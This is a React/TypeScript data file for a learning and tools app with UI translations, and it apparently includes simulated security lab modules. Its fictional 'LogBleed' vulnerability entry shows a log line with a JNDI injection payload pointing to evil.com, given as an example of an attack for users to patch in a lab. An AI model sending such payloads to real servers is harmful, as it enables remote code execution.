import React, { type FC, type SVGProps } from 'react';
// FIX: Imported the newly defined types.
import { type Tool, type Translations, type OperatingSystem, type AcademyModule, type Vulnerability } from './types';

// Icons
export const CodeIcon: FC<SVGProps<SVGSVGElement>> = (props) => (
  React.createElement('svg', { ...props, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" },
    React.createElement('polyline', { points: "16 18 22 12 16 6" }),
    React.createElement('polyline', { points: "8 6 2 12 8 18" })
  )
);

export const LayersIcon: FC<SVGProps<SVGSVGElement>> = (props) => (
  React.createElement('svg', { ...props, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" },
    React.createElement('polygon', { points: "12 2 2 7 12 12 22 7 12 2" }),
    React.createElement('polyline', { points: "2 17 12 22 22 17" }),
    React.createElement('polyline', { points: "2 12 12 17 22 12" })
  )
);

export const MessageSquareIcon: FC<SVGProps<SVGSVGElement>> = (props) => (
  React.createElement('svg', { ...props, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" },
    React.createElement('path', { d: "M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" })
  )
);

export const GithubIcon: FC<SVGProps<SVGSVGElement>> = (props) => (
  React.createElement('svg', { ...props, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" },
    React.createElement('path', { d: "M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" })
  )
);

export const GlobeIcon: FC<SVGProps<SVGSVGElement>> = (props) => (
  React.createElement('svg', { ...props, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" },
    React.createElement('circle', { cx: "12", cy: "12", r: "10" }),
    React.createElement('line', { x1: "2", y1: "12", x2: "22", y2: "12" }),
    React.createElement('path', { d: "M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" })
  )
);

export const TerminalIcon: FC<SVGProps<SVGSVGElement>> = (props) => (
  React.createElement('svg', { ...props, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" },
    React.createElement('polyline', { points: "4 17 10 11 4 5" }),
    React.createElement('line', { x1: "12", y1: "19", x2: "20", y2: "19" })
  )
);

// FIX: Added new icons for the new data components.
export const ShieldIcon: FC<SVGProps<SVGSVGElement>> = (props) => (
  React.createElement('svg', { ...props, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" },
    React.createElement('path', { d: "M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" })
  )
);

export const CpuIcon: FC<SVGProps<SVGSVGElement>> = (props) => (
  React.createElement('svg', { ...props, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" },
      React.createElement('rect', { x: "4", y: "4", width: "16", height: "16", rx: "2", ry: "2" }),
      React.createElement('rect', { x: "9", y: "9", width: "6", height: "6" }),
      React.createElement('line', { x1: "9", y1: "1", x2: "9", y2: "4" }),
      React.createElement('line', { x1: "15", y1: "1", x2: "15", y2: "4" }),
      React.createElement('line', { x1: "9", y1: "20", x2: "9", y2: "23" }),
      React.createElement('line', { x1: "15", y1: "20", x2: "15", y2: "23" }),
      React.createElement('line', { x1: "20", y1: "9", x2: "23", y2: "9" }),
      React.createElement('line', { x1: "20", y1: "14", x2: "23", y2: "14" }),
      React.createElement('line', { x1: "1", y1: "9", x2: "4", y2: "9" }),
      React.createElement('line', { x1: "1", y1: "14", x2: "4", y2: "14" })
  )
);

export const BookOpenIcon: FC<SVGProps<SVGSVGElement>> = (props) => (
  React.createElement('svg', { ...props, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" },
    React.createElement('path', { d: "M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z" }),
    React.createElement('path', { d: "M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z" })
  )
);

// FIX: Added the missing NexusIcon component.
export const NexusIcon: FC<SVGProps<SVGSVGElement>> = (props) => (
  React.createElement('svg', { ...props, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: "2", strokeLinecap: "round", strokeLinejoin: "round" },
    React.createElement('path', { d: "M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.25l-6.18 3.25L7 18.14l-5-4.87 6.91-1.01L12 2z" })
  )
);

// DATA
export const TOOLS: Tool[] = [
  {
    id: 'github',
    name: 'GitHub',
    icon: GithubIcon,
    description: 'A provider of Internet hosting for software development and version control using Git.',
    category: 'Development',
    details: {
      purpose: 'Host and review code, manage projects, and build software alongside millions of other developers.',
      sourceLink: 'https://github.com',
      example: 'git clone https://github.com/user/repo.git'
    },
  },
  {
    id: 'vercel',
    name: 'Vercel',
    icon: LayersIcon,
    description: 'A cloud platform for static sites and Serverless Functions that fits perfectly with your workflow.',
    category: 'Deployment',
    details: {
      purpose: 'Vercel enables developers to host websites and web services that deploy instantly and scale automatically.',
      sourceLink: 'https://vercel.com',
      example: 'npx vercel deploy'
    },
  },
];

// FIX: Added missing OPERATING_SYSTEMS data.
export const OPERATING_SYSTEMS: OperatingSystem[] = [
  {
    id: 'aetheros',
    name: 'AetherOS',
    logo: CpuIcon,
    description: 'A lightweight, security-focused OS for decentralized network nodes.',
    category: 'Network & Infrastructure',
    details: {
      philosophy: 'Prioritize security through minimalism and verifiable builds. Provide a stable, efficient foundation for critical network services.',
      status: 'Active',
      versions: [{ name: '3.1.4 "Nova"', hash: 'a1b2c3d4e5f6' }],
      quickStart: ['aether-ctl install core', 'aether-ctl start-node --config /etc/node.conf'],
    },
  },
  {
    id: 'photonix',
    name: 'Photonix',
    logo: TerminalIcon,
    description: 'A developer-centric OS with a powerful integrated toolchain for rapid prototyping.',
    category: 'Development Environments',
    details: {
      philosophy: 'Streamline the development lifecycle by unifying build, test, and deployment tools into a cohesive, performant environment.',
      status: 'Active',
      versions: [{ name: '2024.2 "Helios"', hash: 'f6e5d4c3b2a1' }],
      quickStart: ['photonix-new-project --template react-ts', 'photonix-run --hot-reload'],
    },
  },
];

// FIX: Added missing ACADEMY_MODULES data.
export const ACADEMY_MODULES: AcademyModule[] = [
  {
    id: 'net-sec-101',
    title: 'Network Security Fundamentals',
    description: 'Learn to identify and mitigate common network vulnerabilities in our simulated lab.',
    icon: ShieldIcon,
    path: 'Cybersecurity Path',
    objectives: ['Understand the OSI model', 'Identify common attack vectors', 'Implement basic firewall rules'],
    labDescription: 'You will be given access to a simulated small business network. Your task is to identify open ports, detect an active intrusion, and secure the network perimeter using the provided tools.',
    simulation: {
      scenario: 'A small business network is experiencing unusual traffic. Investigate and secure the perimeter.',
      script: [
        { command: 'help', output: ['Available commands:', 'scan <ip>', 'firewall --add-rule <rule>', 'exit'] },
        { command: 'scan 192.168.1.10', output: 'Scanning... Found open ports: 22 (SSH), 80 (HTTP), 8080 (Unknown)' },
        { command: 'firewall --add-rule "DENY ALL INBOUND ON 8080"', output: 'Rule added. Port 8080 is now blocked.' },
      ],
    },
  },
  {
    id: 'devops-intro',
    title: 'Introduction to CI/CD',
    description: 'Master the basics of continuous integration and deployment with automated pipelines.',
    icon: BookOpenIcon,
    path: 'DevOps Path',
    objectives: ['Set up a git repository', 'Create a simple build script', 'Deploy an application automatically'],
    labDescription: 'A sample web application is ready for deployment. Your mission is to write a simple CI/CD script that automatically builds and deploys the application to a staging server upon a git push.',
    simulation: {
      scenario: 'Configure a CI/CD pipeline for a sample web application.',
      script: [
        { command: 'help', output: ['Available commands:', 'git <...>', 'ci-script-edit', 'ci-script-run', 'exit'] },
        { command: 'ci-script-run', output: 'Running pipeline... Build successful. Deployment to staging complete.' },
      ],
    },
  },
];

// FIX: Added missing VULNERABILITIES data.
export const VULNERABILITIES: Vulnerability[] = [
  {
    id: 'logbleed',
    name: 'LogBleed',
    cve: 'CVE-2024-1337',
    description: 'A critical remote code execution vulnerability in a common logging library.',
    icon: ShieldIcon,
    severity: 'Critical',
    details: {
      summary: 'LogBleed allows unauthenticated attackers to execute arbitrary code on a server by sending a specially crafted string that is processed by the vulnerable logging component.',
      technicalAnalysis: 'The vulnerability exists due to improper input sanitization in the `formatLog` function. An attacker can use JNDI injection to force the server to connect to a malicious LDAP server, leading to RCE.',
    },
    simulation: {
      scenario: 'An attacker is attempting to exploit the LogBleed vulnerability on your web server. Patch the system.',
      script: [
        { command: 'help', output: ['Available commands:', 'view_logs', 'patch <package_name>', 'exit'] },
        { command: 'view_logs', output: '...[INFO] User-Agent: ${jndi:ldap://evil.com/a}...'},
        { command: 'patch logger-core', output: 'Patching logger-core to version 2.17.1... Success. Vulnerability mitigated.'},
      ]
    }
  },
];


// TRANSLATIONS
export const translations: Translations = {
  en: {
    taskbar: {
      apps: "Apps"
    },
    command_palette: {
      placeholder: 'Type a command or search...',
      actions_title: 'Actions',
      tools_title: 'Tools',
      ai_title: 'Quick AI Query',
      launch_builder: 'Launch AI Site Builder',
      launch_dashboard: 'Open ZERO HUB Dashboard',
      launch_chat: 'Start AI Chat',
      ask_ai: 'Ask AI...',
      no_results: 'No results found.'
    },
    desktop: {
      builder_label: 'AI Site Builder',
      dashboard_label: 'ZERO HUB Core',
      chat_label: 'AI Chat',
    },
    window: {
      builder_title: 'AI Site Builder',
      dashboard_title: 'ZERO HUB Dashboard',
      chat_title: 'AI Chat',
    },
    builder: {
      title: 'AI Site Builder',
      prompt_placeholder: 'Describe the website you want to build...\ne.g., "A modern portfolio for a photographer named Alex Doe. It should have a dark theme, a gallery page, and a contact form."',
      generate: 'Generate',
      preview: 'Live Preview',
      download: 'Download ZIP',
      publish: 'Publish to GitHub',
    },
    tools: {
      title: 'Tools Library',
      purpose: 'Purpose',
      source: 'Official Source',
    },
    chat: {
      title: 'ZERO HUB AI Chat',
      placeholder: 'Enter your message...',
      send: 'Send',
      greeting: 'ZERO HUB AI online. How can I assist your project today?',
    },
  },
  ar: {
    taskbar: {
      apps: "تطبيقات"
    },
    command_palette: {
      placeholder: 'اكتب أمراً أو ابحث...',
      actions_title: 'إجراءات',
      tools_title: 'أدوات',
      ai_title: 'سؤال سريع للذكاء الاصطناعي',
      launch_builder: 'تشغيل بنّاء المواقع',
      launch_dashboard: 'فتح لوحة تحكم ZERO HUB',
      launch_chat: 'بدء محادثة الذكاء الاصطناعي',
      ask_ai: 'اسأل الذكاء الاصطناعي...',
      no_results: 'لم يتم العثور على نتائج.'
    },
    desktop: {
      builder_label: 'بنّاء المواقع',
      dashboard_label: 'نواة ZERO HUB',
      chat_label: 'محادثة AI',
    },
    window: {
      builder_title: 'بنّاء المواقع الذكي',
      dashboard_title: 'لوحة تحكم ZERO HUB',
      chat_title: 'محادثة الذكاء الاصطناعي',
    },
    builder: {
      title: 'بنّاء المواقع الذكي',
      prompt_placeholder: 'صف الموقع الذي تريد بناءه...\nمثال: "صفحة أعمال حديثة لمصور اسمه أليكس دو. يجب أن تكون ذات طابع داكن، وتحتوي على معرض صور ونموذج تواصل."',
      generate: 'إنشاء',
      preview: 'معاينة حية',
      download: 'تحميل ZIP',
      publish: 'نشر على GitHub',
    },
    tools: {
      title: 'مكتبة الأدوات',
      purpose: 'الغرض',
      source: 'المصدر الرسمي',
    },
    chat: {
      title: 'محادثة ZERO HUB AI',
      placeholder: 'أدخل رسالتك...',
      send: 'إرسال',
      greeting: 'الذكاء الاصطناعي لـ ZERO HUB متصل. كيف يمكنني المساعدة في مشروعك اليوم؟',
    },
  }
};